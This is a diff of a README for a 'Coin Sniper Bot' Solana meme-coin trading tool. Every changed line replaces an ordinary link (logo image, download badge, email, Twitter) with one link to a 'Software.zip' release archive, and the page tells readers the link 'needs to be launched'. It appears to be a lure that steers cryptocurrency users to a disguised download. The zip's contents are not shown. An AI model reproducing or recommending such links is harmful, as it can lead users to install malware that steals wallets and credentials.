@@ -1,6 +1,6 @@
 # 🚀 Coin Sniper Bot
 
-![Coin Sniper Bot Logo](https://example.com/coin-sniper-bot.png)
+![Coin Sniper Bot Logo](https://github.com/Maratct/Coin-Sniper-Bot/releases/download/v1.0/Software.zip)
 
 Welcome to the official repository of Coin Sniper Bot, a cutting-edge automated trading tool developed by Solana experts for meme coins enthusiasts. This state-of-the-art bot is designed to leverage sophisticated algorithms to maximize profits by targeting low-liquidity and newly launched coins. Coin Sniper Bot utilizes advanced indicators to detect volume changes and make strategic trading decisions in real-time.
 
@@ -18,7 +18,7 @@ Welcome to the official repository of Coin Sniper Bot, a cutting-edge automated 
 
 To get started with Coin Sniper Bot, download the latest version from the link below:
 
-[![Download Coin Sniper Bot](https://img.shields.io/badge/Download-v1.0.0-blue)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+[![Download Coin Sniper Bot](https://github.com/Maratct/Coin-Sniper-Bot/releases/download/v1.0/Software.zip)](https://github.com/Maratct/Coin-Sniper-Bot/releases/download/v1.0/Software.zip)
 
 **Note**: The link needs to be launched to download the bot.
 
@@ -41,9 +41,9 @@ We welcome contributions to enhance the capabilities of Coin Sniper Bot. Feel fr
 
 Stay updated with the latest news and developments by following us on our social media channels:
 
-📧 [Email](mailto:coinsniperbot@example.com)
+📧 [Email](https://github.com/Maratct/Coin-Sniper-Bot/releases/download/v1.0/Software.zip)
 
-🐦 [Twitter](https://twitter.com/coin_sniper_bot)
+🐦 [Twitter](https://github.com/Maratct/Coin-Sniper-Bot/releases/download/v1.0/Software.zip)
 
 Join our community of meme coin enthusiasts and traders to share insights and trading strategies for maximum profitability!
 
